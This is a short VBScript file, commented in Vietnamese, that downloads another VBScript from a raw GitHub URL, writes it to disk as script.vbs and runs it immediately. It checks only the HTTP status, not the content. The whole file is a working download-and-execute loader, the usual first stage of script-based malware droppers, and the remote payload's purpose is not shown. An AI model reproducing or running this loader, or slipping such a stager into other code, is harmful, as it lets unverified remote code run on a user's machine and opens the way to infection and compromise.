Dim http, url, fileName, fileSys, file, objShell

' URL của file raw
url = "https://raw.githubusercontent.com/2UY5/1/refs/heads/main/2.vbs"

' Tên file để lưu
fileName = "script.vbs"

' Tạo đối tượng WinHTTP để tải nội dung
Set http = CreateObject("WinHTTP.WinHTTPRequest.5.1")
http.Open "GET", url, False
http.Send

' Kiểm tra nếu yêu cầu thành công
If http.Status = 200 Then
    ' Lưu nội dung vào file .vbs
    Set fileSys = CreateObject("Scripting.FileSystemObject")
    Set file = fileSys.CreateTextFile(fileName, True)
    file.Write http.responseText
    file.Close
    
    ' Khởi chạy file .vbs vừa tạo
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run fileName
Else
    MsgBox "Lỗi khi tải file từ link!"
End If
